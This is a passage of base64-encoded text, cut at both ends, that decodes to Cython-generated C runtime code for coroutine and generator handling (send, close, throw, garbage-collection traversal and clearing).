QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIHJldCwgcmV0dmFsLCAwKTsKICAgIFB5X1hERUNSRUYocmV0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1NlbmQoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp2YWx1ZSkgewogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0FtU2VuZChzZWxmLCB2YWx1ZSwgJnJldHZhbCk7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDApOwp9CnN0YXRpYyBfX1B5eF9QeVNlbmRSZXN1bHQKX19QeXhfQ29yb3V0aW5lX0FtU2VuZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqKnJldHZhbCkgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCopIHNlbGY7CiAgICBpZiAodW5saWtlbHkoX19QeXhfQ29yb3V0aW5lX3Rlc3RfYW5kX3NldF9pc19ydW5uaW5nKGdlbikpKSB7CiAgICAgICAgKnJldHZhbCA9IF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQogICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoZ2VuLCBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kLCB2YWx1ZSwgcmV0dmFsKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAoZ2VuLT55aWVsZGZyb20pIHsKICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAjaWYgIUNZVEhPTl9VU0VfQU1fU0VORAogICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICAjZW5kaWYKICAgICAgICAjaWZkZWYgX19QeXhfQ29yb3V0aW5lX1VTRUQKICAgICAgICBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Bc3luY0dlbl9VU0VECiAgICAgICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9hc3luY19nZW5fYXNlbmRfc2VuZCh5ZiwgdmFsdWUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICAgICBpZiAoUHlHZW5fQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlHZW5fU2VuZCgoUHlHZW5PYmplY3QqKXlmLCB2YWx1ZSA9PSBQeV9Ob25lID8gTlVMTCA6IHZhbHVlKTsKICAgICAgICB9IGVsc2UKICAgICAgICBpZiAoUHlDb3JvX0NoZWNrRXhhY3QoeWYpKSB7CiAgICAgICAgICAgIHJldCA9IF9fUHl4X1B5R2VuX1NlbmQoKFB5R2VuT2JqZWN0Kil5ZiwgdmFsdWUgPT0gUHlfTm9uZSA/IE5VTEwgOiB2YWx1ZSk7CiAgICAgICAgfSBlbHNlCiAgICAgICAgI2VuZGlmCiAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgICAgI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMAogICAgICAgICAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSAmJiBQeUl0ZXJfQ2hlY2soeWYpKQogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlJdGVyX05leHRfUGxhaW4oeWYpOwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE1ldGhvZDEoeWYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZW5kLCB2YWx1ZSk7CiAgICAgICAgfQogICAgICAgIGlmIChsaWtlbHkocmV0KSkgewogICAgICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgICAgICAqcmV0dmFsID0gcmV0OwogICAgICAgICAgICByZXR1cm4gUFlHRU5fTkVYVDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCByZXR2YWwpOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgdmFsdWUsIHJldHZhbCwgMCk7CiAgICB9CiAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4sIFB5T2JqZWN0ICp5ZikgewogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoZ2VuKTsKICAgIGFzc2VydChfX1B5eF9Db3JvdXRpbmVfZ2V0X2lzX3J1bm5pbmcoZ2VuKSk7CiAgICAjaWZkZWYgX19QeXhfR2VuZXJhdG9yX1VTRUQKICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICAjZW5kaWYKICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgaWYgKF9fUHl4X0Nvcm91dGluZV9DaGVjayh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoeWYsICZyZXR2YWwpOwogICAgfSBlbHNlCiAgICBpZiAoX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVBd2FpdF9DbG9zZSgoX19weXhfQ29yb3V0aW5lQXdhaXRPYmplY3QqKXlmKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgaWYgKF9fcHl4X1B5QXN5bmNHZW5BU2VuZF9DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJldHZhbCA9IF9fUHl4X2FzeW5jX2dlbl9hc2VuZF9jbG9zZSh5ZiwgTlVMTCk7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgfSBlbHNlCiAgICBpZiAoX19weXhfUHlBc3luY0dlbkFUaHJvd19DaGVja0V4YWN0KHlmKSkgewogICAgICAgIHJldHZhbCA9IF9fUHl4X2FzeW5jX2dlbl9hdGhyb3dfY2xvc2UoeWYsIE5VTEwpOwogICAgICAgIHJlc3VsdCA9IFBZR0VOX1JFVFVSTjsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICB7CiAgICAgICAgUHlPYmplY3QgKm1ldGg7CiAgICAgICAgcmVzdWx0ID0gUFlHRU5fUkVUVVJOOwogICAgICAgIG1ldGggPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyTm9FcnJvcih5ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nsb3NlKTsKICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgewogICAgICAgICAgICAgICAgUHlFcnJfV3JpdGVVbnJhaXNhYmxlKHlmKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHZhbCA9IF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhtZXRoKTsKICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIXJldHZhbCkpIHsKICAgICAgICAgICAgICAgIHJlc3VsdCA9IFBZR0VOX0VSUk9SOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgcmV0dXJuIHJlc3VsdCA9PSBQWUdFTl9FUlJPUiA/IC0xIDogMDsKfQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dlbmVyYXRvcl9OZXh0KFB5T2JqZWN0ICpzZWxmKSB7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QqKSBzZWxmOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgfQogICAgI2lmIENZVEhPTl9VU0VfQU1fU0VORAogICAgaWYgKGdlbi0+eWllbGRmcm9tX2FtX3NlbmQpIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZFRvRGVsZWdhdGUoZ2VuLCBnZW4tPnlpZWxkZnJvbV9hbV9zZW5kLCBQeV9Ob25lLCAmcmV0dmFsKTsKICAgIH0gZWxzZQogICAgI2VuZGlmCiAgICBpZiAoZ2VuLT55aWVsZGZyb20pIHsKICAgICAgICBQeU9iamVjdCAqeWYgPSBnZW4tPnlpZWxkZnJvbTsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAgICNpZmRlZiBfX1B5eF9HZW5lcmF0b3JfVVNFRAogICAgICAgIGlmIChfX1B5eF9HZW5lcmF0b3JfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfR2VuZXJhdG9yX05leHQoeWYpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIGlmIChfX1B5eF9Db3JvdXRpbmVfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmQoeWYsIFB5X05vbmUpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgKFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDBBMyB8fCAhQ1lUSE9OX1VTRV9BTV9TRU5EKQogICAgICAgIGlmIChQeUdlbl9DaGVja0V4YWN0KHlmKSkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUdlbl9TZW5kKChQeUdlbk9iamVjdCopeWYsIE5VTEwpOwogICAgICAgIH0gZWxzZQogICAgICAgICNlbmRpZgogICAgICAgICAgICByZXQgPSBfX1B5eF9QeUl0ZXJfTmV4dF9QbGFpbih5Zik7CiAgICAgICAgaWYgKGxpa2VseShyZXQpKSB7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgICAgIHJldHVybiByZXQ7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9GaW5pc2hEZWxlZ2F0aW9uKGdlbiwgJnJldHZhbCk7CiAgICB9IGVsc2UgewogICAgICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBQeV9Ob25lLCAmcmV0dmFsLCAwKTsKICAgIH0KICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDEpOwp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX0Nsb3NlX01ldGhvZChQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKmFyZykgewogICAgUHlPYmplY3QgKnJldHZhbCA9IE5VTEw7CiAgICBfX1B5eF9QeVNlbmRSZXN1bHQgcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoYXJnKTsKICAgIHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZShzZWxmLCAmcmV0dmFsKTsKICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gUFlHRU5fRVJST1IpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgUHlfWERFQ1JFRihyZXR2YWwpOwogICAgUHlfUkVUVVJOX05PTkU7Cn0Kc3RhdGljIF9fUHl4X1B5U2VuZFJlc3VsdApfX1B5eF9Db3JvdXRpbmVfQ2xvc2UoUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICoqcmV0dmFsKSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQ7CiAgICBQeU9iamVjdCAqeWY7CiAgICBpbnQgZXJyID0gMDsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpIHsKICAgICAgICAqcmV0dmFsID0gX19QeXhfQ29yb3V0aW5lX0FscmVhZHlSdW5uaW5nRXJyb3IoZ2VuKTsKICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9CiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgaWYgKHlmKSB7CiAgICAgICAgUHlfSU5DUkVGKHlmKTsKICAgICAgICBlcnIgPSBfX1B5eF9Db3JvdXRpbmVfQ2xvc2VJdGVyKGdlbiwgeWYpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgUHlfREVDUkVGKHlmKTsKICAgIH0KICAgIGlmIChlcnIgPT0gMCkKICAgICAgICBQeUVycl9TZXROb25lKFB5RXhjX0dlbmVyYXRvckV4aXQpOwogICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX1NlbmRFeChnZW4sIE5VTEwsIHJldHZhbCwgMSk7CiAgICBpZiAocmVzdWx0ID09IFBZR0VOX0VSUk9SKSB7CiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlCiAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIGlmICghX19QeXhfUHlFcnJfT2NjdXJyZWQoKSkgewogICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgICAgIH0gZWxzZSBpZiAobGlrZWx5KF9fUHl4X1B5RXJyX0V4Y2VwdGlvbk1hdGNoZXMyKFB5RXhjX0dlbmVyYXRvckV4aXQsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkgewogICAgICAgICAgICBfX1B5eF9QeUVycl9DbGVhcigpOwogICAgICAgICAgICByZXR1cm4gUFlHRU5fUkVUVVJOOwogICAgICAgIH0KICAgICAgICByZXR1cm4gUFlHRU5fRVJST1I7CiAgICB9IGVsc2UgaWYgKGxpa2VseShyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmICpyZXR2YWwgPT0gUHlfTm9uZSkpIHsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBQWUdFTl9SRVRVUk47CiAgICB9IGVsc2UgewogICAgICAgIGNvbnN0IGNoYXIgKm1zZzsKICAgICAgICBQeV9ERUNSRUYoKnJldHZhbCk7CiAgICAgICAgKnJldHZhbCA9IE5VTEw7CiAgICAgICAgaWYgKCgwKSkgewogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lX0NoZWNrKHNlbGYpKSB7CiAgICAgICAgICAgIG1zZyA9ICJjb3JvdXRpbmUgaWdub3JlZCBHZW5lcmF0b3JFeGl0IjsKICAgICAgICAjZW5kaWYKICAgICAgICAjaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQXN5bmNHZW5fQ2hlY2tFeGFjdChzZWxmKSkgewogICAgICAgICAgICBtc2cgPSAiYXN5bmMgZ2VuZXJhdG9yIGlnbm9yZWQgR2VuZXJhdG9yRXhpdCI7CiAgICAgICAgI2VuZGlmCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgbXNnID0gImdlbmVyYXRvciBpZ25vcmVkIEdlbmVyYXRvckV4aXQiOwogICAgICAgIH0KICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfUnVudGltZUVycm9yLCBtc2cpOwogICAgICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAgICAgcmV0dXJuIFBZR0VOX0VSUk9SOwogICAgfQp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfX0Nvcm91dGluZV9UaHJvdyhQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCwgUHlPYmplY3QgKnZhbCwgUHlPYmplY3QgKnRiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmFyZ3MsIGludCBjbG9zZV9vbl9nZW5leGl0KSB7CiAgICBfX3B5eF9Db3JvdXRpbmVPYmplY3QgKmdlbiA9IChfX3B5eF9Db3JvdXRpbmVPYmplY3QgKikgc2VsZjsKICAgIFB5T2JqZWN0ICp5ZjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9Db3JvdXRpbmVfdGVzdF9hbmRfc2V0X2lzX3J1bm5pbmcoZ2VuKSkpCiAgICAgICAgcmV0dXJuIF9fUHl4X0Nvcm91dGluZV9BbHJlYWR5UnVubmluZ0Vycm9yKGdlbik7CiAgICB5ZiA9IGdlbi0+eWllbGRmcm9tOwogICAgaWYgKHlmKSB7CiAgICAgICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqcmV0OwogICAgICAgIFB5X0lOQ1JFRih5Zik7CiAgICAgICAgaWYgKF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyh0eXAsIFB5RXhjX0dlbmVyYXRvckV4aXQpICYmIGNsb3NlX29uX2dlbmV4aXQpIHsKICAgICAgICAgICAgaW50IGVyciA9IF9fUHl4X0Nvcm91dGluZV9DbG9zZUl0ZXIoZ2VuLCB5Zik7CiAgICAgICAgICAgIFB5X0RFQ1JFRih5Zik7CiAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgICAgIGlmIChlcnIgPCAwKQogICAgICAgICAgICAgICAgZ290byBwcm9wYWdhdGVfZXhjZXB0aW9uOwogICAgICAgICAgICBnb3RvIHRocm93X2hlcmU7CiAgICAgICAgfQogICAgICAgIGlmICgwCiAgICAgICAgI2lmZGVmIF9fUHl4X0dlbmVyYXRvcl9VU0VECiAgICAgICAgICAgIHx8IF9fUHl4X0dlbmVyYXRvcl9DaGVja0V4YWN0KHlmKQogICAgICAgICNlbmRpZgogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgICAgICB8fCBfX1B5eF9Db3JvdXRpbmVfQ2hlY2soeWYpCiAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICkgewogICAgICAgICAgICByZXQgPSBfX1B5eF9fQ29yb3V0aW5lX1Rocm93KHlmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIGNsb3NlX29uX2dlbmV4aXQpOwogICAgICAgICNpZmRlZiBfX1B5eF9Db3JvdXRpbmVfVVNFRAogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfQ29yb3V0aW5lQXdhaXRfQ2hlY2tFeGFjdCh5ZikpIHsKICAgICAgICAgICAgcmV0ID0gX19QeXhfX0Nvcm91dGluZV9UaHJvdygoKF9fcHl4X0Nvcm91dGluZUF3YWl0T2JqZWN0Kil5ZiktPmNvcm91dGluZSwgdHlwLCB2YWwsIHRiLCBhcmdzLCBjbG9zZV9vbl9nZW5leGl0KTsKICAgICAgICAjZW5kaWYKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBQeU9iamVjdCAqbWV0aCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKHlmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyb3cpOwogICAgICAgICAgICBpZiAodW5saWtlbHkoIW1ldGgpKSB7CiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSB7CiAgICAgICAgICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fUHl4X0Nvcm91dGluZV9VbmRlbGVnYXRlKGdlbik7CiAgICAgICAgICAgICAgICBnb3RvIHRocm93X2hlcmU7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGxpa2VseShhcmdzKSkgewogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfQ2FsbChtZXRoLCBhcmdzLCBOVUxMKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjYXJnc1s0XSA9IHtOVUxMLCB0eXAsIHZhbCwgdGJ9OwogICAgICAgICAgICAgICAgcmV0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwobWV0aCwgY2FyZ3MrMSwgMyB8IF9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgUHlfREVDUkVGKG1ldGgpOwogICAgICAgIH0KICAgICAgICBQeV9ERUNSRUYoeWYpOwogICAgICAgIGlmIChyZXQpIHsKICAgICAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICAgICAgcmV0dXJuIHJldDsKICAgICAgICB9CiAgICAgICAgcmVzdWx0ID0gX19QeXhfQ29yb3V0aW5lX0ZpbmlzaERlbGVnYXRpb24oZ2VuLCAmcmV0KTsKICAgICAgICBfX1B5eF9Db3JvdXRpbmVfdW5zZXRfaXNfcnVubmluZyhnZW4pOwogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfTWV0aG9kUmV0dXJuRnJvbVJlc3VsdChzZWxmLCByZXN1bHQsIHJldCwgMCk7CiAgICB9CnRocm93X2hlcmU6CiAgICBfX1B5eF9SYWlzZSh0eXAsIHZhbCwgdGIsIE5VTEwpOwpwcm9wYWdhdGVfZXhjZXB0aW9uOgogICAgewogICAgICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgICAgIF9fUHl4X1B5U2VuZFJlc3VsdCByZXN1bHQgPSBfX1B5eF9Db3JvdXRpbmVfU2VuZEV4KGdlbiwgTlVMTCwgJnJldHZhbCwgMCk7CiAgICAgICAgX19QeXhfQ29yb3V0aW5lX3Vuc2V0X2lzX3J1bm5pbmcoZ2VuKTsKICAgICAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX01ldGhvZFJldHVybkZyb21SZXN1bHQoc2VsZiwgcmVzdWx0LCByZXR2YWwsIDApOwogICAgfQp9CnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ29yb3V0aW5lX1Rocm93KFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJncykgewogICAgUHlPYmplY3QgKnR5cDsKICAgIFB5T2JqZWN0ICp2YWwgPSBOVUxMOwogICAgUHlPYmplY3QgKnRiID0gTlVMTDsKICAgIGlmICh1bmxpa2VseSghUHlBcmdfVW5wYWNrVHVwbGUoYXJncywgInRocm93IiwgMSwgMywgJnR5cCwgJnZhbCwgJnRiKSkpCiAgICAgICAgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gX19QeXhfX0Nvcm91dGluZV9UaHJvdyhzZWxmLCB0eXAsIHZhbCwgdGIsIGFyZ3MsIDEpOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Db3JvdXRpbmVfdHJhdmVyc2VfZXhjc3RhdGUoX19QeXhfRXhjSW5mb1N0cnVjdCAqZXhjX3N0YXRlLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewojaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNAogICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdmFsdWUpOwojZWxzZQogICAgUHlfVklTSVQoZXhjX3N0YXRlLT5leGNfdHlwZSk7CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y192YWx1ZSk7CiAgICBQeV9WSVNJVChleGNfc3RhdGUtPmV4Y190cmFjZWJhY2spOwojZW5kaWYKICAgIHJldHVybiAwOwp9CnN0YXRpYyBpbnQgX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykgewogICAgewogICAgICAgIGludCBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKChQeU9iamVjdCopZ2VuLCAxLCB2aXNpdCwgYXJnKTsKICAgICAgICBpZiAoZSkgcmV0dXJuIGU7CiAgICB9CiAgICBQeV9WSVNJVChnZW4tPmNsb3N1cmUpOwogICAgUHlfVklTSVQoZ2VuLT5jbGFzc29iaik7CiAgICBQeV9WSVNJVChnZW4tPnlpZWxkZnJvbSk7CiAgICByZXR1cm4gX19QeXhfQ29yb3V0aW5lX3RyYXZlcnNlX2V4Y3N0YXRlKCZnZW4tPmdpX2V4Y19zdGF0ZSwgdmlzaXQsIGFyZyk7Cn0Kc3RhdGljIGludCBfX1B5eF9Db3JvdXRpbmVfY2xlYXIoUHlPYmplY3QgKnNlbGYpIHsKICAgIF9fcHl4X0Nvcm91dGluZU9iamVjdCAqZ2VuID0gKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqKSBzZWxmOwogICAgUHlfQ0xFQVIoZ2VuLT5jbG9zdXJlKTsKICAgIFB5X0NMRUFSKGdlbi0+Y2xhc3NvYmopOwogICAgX19QeXhfQ29yb3V0aW5lX1VuZGVsZWdhdGUoZ2VuKTsKICAgIF9fUHl4X0Nvcm91dGluZV9FeGNlcHRpb25DbGVhcigmZ2VuLT5naV9leGNfc3RhdGUpOwojaWZkZWYgX19QeXhfQXN5bmNHZW5fVVNFRAogICAgaWYgKF9fUHl4X0FzeW5jR2VuX0NoZWNrRXhhY3Qoc2VsZikpIHsKICAgICAgICBQeV9DTEVBUigoKF9fcHl4X1B5QXN5bmNHZW5PYmplY3QqKWdlbiktPmFnX2ZpbmFsaXplcik7CiAgICB9CiNlbmRpZgogICAgUHlfQ0xFQVIoZ2VuLT5naV9jb2RlKTsKICAgIFB5X0NMRUFSKGdlbi0+Z2lfZnJhbWUpOwogICAgUHlfQ0xFQVIoZ2VuLT5naV9uYW1lKTsKICAgIFB5X0NMRUFSKGdlbi0+Z2lfcXVhbG5hbWU